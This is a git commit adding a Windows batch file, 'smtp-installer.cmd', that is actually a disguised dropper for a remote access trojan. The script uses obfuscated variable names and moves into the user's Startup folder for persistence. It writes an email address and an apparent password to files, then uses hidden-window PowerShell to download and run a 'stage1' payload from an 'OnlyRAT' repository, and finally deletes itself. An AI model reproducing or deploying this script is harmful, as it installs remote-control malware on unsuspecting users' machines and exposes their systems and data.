b137d9c723109b042e29e98c67f4a3b236e37bca
JadeCosmo <102710086+JadeCosmo@users.noreply.github.com>
2022-04-05 15:37:08 +0000

    Add files via upload

---
+++ smtp-installer.cmd
@@ -0,0 +1,10 @@
+@echo off
+set "XNjFYKECht=%cd%"
+set "YKHfpmMRoQ=C:/Users/itsno/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+cd %YKHfpmMRoQ%
+echo underthetablejade@gmail.com > XbrMzmCUiE.txt
+echo 6922568729956382Za! > UJbMLjTIDr.txt
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/stage1.cmd -OutFile wEaoFkNduy.cmd"
+powershell ./wEaoFkNduy.cmd
+cd "%XNjFYKECht%"
+del smtp-installer.cmd
